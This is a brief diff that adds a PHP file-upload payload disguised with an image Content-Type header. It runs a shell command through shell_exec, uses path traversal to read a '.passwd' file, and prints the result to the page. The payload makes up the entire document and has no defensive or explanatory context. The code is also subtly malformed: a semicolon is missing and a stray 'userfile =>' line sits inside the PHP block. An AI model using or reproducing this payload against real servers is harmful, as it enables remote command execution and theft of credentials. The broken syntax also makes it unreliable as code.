@@ -1,0 +1,10 @@
+
+
+Content-Type: image/png
+<?php
+$output = shell_exec('cat ../../../.passwd');
+echo "<pre>$output</pre>"
+userfile =>
+?>
+
+
